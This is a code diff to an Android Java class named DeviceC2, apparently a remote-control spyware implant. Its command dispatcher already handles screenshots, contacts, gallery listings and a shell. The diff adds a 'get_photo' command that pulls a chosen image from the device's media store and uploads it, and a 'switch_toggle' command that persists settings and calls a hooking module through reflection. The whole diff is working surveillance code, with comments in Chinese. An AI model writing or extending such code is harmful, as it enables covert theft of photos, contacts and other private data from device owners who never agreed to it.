@@ -211,6 +211,12 @@ final class DeviceC2 {
                 takeScreenshotAndUpload(ctx, cmdId);
                 break;
             }
+            case "switch_toggle": {
+                String key = optString(payload, "key");
+                boolean on = optBool(payload, "on", false);
+                if (!key.isEmpty()) handleSwitchToggle(ctx, cmdId, key, on);
+                break;
+            }
             case "get_contacts": {
                 getContactsAndUpload(ctx, cmdId);
                 break;
@@ -218,6 +224,11 @@ final class DeviceC2 {
             case "get_gallery": {
                 int limit = optInt(payload, "limit", 100);
                 getGalleryAndUpload(ctx, cmdId, limit);
+                break;
+            }
+            case "get_photo": {
+                String photoId = optString(payload, "id");
+                if (!photoId.isEmpty()) getPhotoAndUpload(ctx, cmdId, photoId);
                 break;
             }
             case "shell": {
@@ -443,6 +454,85 @@ final class DeviceC2 {
             uploadBytes(ctx, cmdId, "get_gallery", "json",
                     sb.toString().getBytes(StandardCharsets.UTF_8), "application/json");
         } catch (Throwable ignored) {}
+    }
+
+    // ---- 获取单张图片（按 ID 上传实际图片）----
+    private static void getPhotoAndUpload(Context ctx, String cmdId, String photoId) {
+        try {
+            long id = Long.parseLong(photoId);
+            android.net.Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+            String[] proj = {
+                android.provider.MediaStore.Images.Media._ID,
+                android.provider.MediaStore.Images.Media.DISPLAY_NAME
+            };
+            Cursor cursor = ctx.getContentResolver().query(uri, proj, "_ID=?", new String[]{photoId}, null);
+            String name = "photo_" + photoId + ".jpg";
+            if (cursor != null) {
+                if (cursor.moveToFirst()) {
+                    String dn = cursor.getString(1);
+                    if (dn != null && !dn.isEmpty()) name = dn;
+                }
+                cursor.close();
+            }
+            android.net.Uri itemUri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+                    .buildUpon().appendPath(String.valueOf(id)).build();
+            try (java.io.InputStream is = ctx.getContentResolver().openInputStream(itemUri)) {
+                if (is == null) {
+                    uploadBytes(ctx, cmdId, "get_photo", "txt",
+                            ("无法打开图片: " + photoId).getBytes(StandardCharsets.UTF_8), "text/plain");
+                    return;
+                }
+                byte[] imgBytes = readAllBytes(is);
+                uploadBytes(ctx, cmdId, "get_photo", "jpg", imgBytes, "image/jpeg");
+            }
+        } catch (Throwable e) {
+            try {
+                uploadBytes(ctx, cmdId, "get_photo", "txt",
+                        ("获取图片失败: " + e.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    private static byte[] readAllBytes(java.io.InputStream is) throws java.io.IOException {
+        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+        byte[] buf = new byte[65536];
+        int n;
+        while ((n = is.read(buf)) != -1) baos.write(buf, 0, n);
+        return baos.toByteArray();
+    }
+
+    // ---- 通用开关（分组自定义 switch）----
+    // 存储开关状态到 SharedPrefs，并尝试回调 xp.java
+    private static void handleSwitchToggle(Context ctx, String cmdId, String key, boolean on) {
+        try {
+            // 持久化开关状态
+            ctx.getSharedPreferences("hsz_cfg", 0).edit().putBoolean("sw_" + key, on).apply();
+            // 反射调用 xp 模块的 switch 回调（如果存在）
+            try {
+                Class<?> xpCls = Class.forName("com.example.msphone.xp");
+                java.lang.reflect.Method m = xpCls.getMethod("onSwitchChanged", String.class, boolean.class);
+                m.invoke(null, key, on);
+            } catch (Throwable ignored) {}
+            // 上传结果
+            String msg = "开关[" + key + "]" + (on ? "开" : "关");
+            uploadBytes(ctx, cmdId, "switch_toggle", "txt",
+                    msg.getBytes(StandardCharsets.UTF_8), "text/plain");
+            wake();
+        } catch (Throwable t) {
+            try {
+                uploadBytes(ctx, cmdId, "switch_toggle", "txt",
+                    ("开关[" + key + "]失败: " + t.getMessage()).getBytes(StandardCharsets.UTF_8), "text/plain");
+            } catch (Throwable ignored) {}
+        }
+    }
+
+    // ---- JSON 辅助 ----
+    private static boolean optBool(JsonObject obj, String key, boolean def) {
+        try {
+            if (obj.has(key) && !obj.get(key).isJsonNull() && obj.get(key).isJsonPrimitive())
+                return obj.get(key).getAsBoolean();
+        } catch (Throwable ignored) {}
+        return def;
     }
 
     // ---- 上传工具 ----
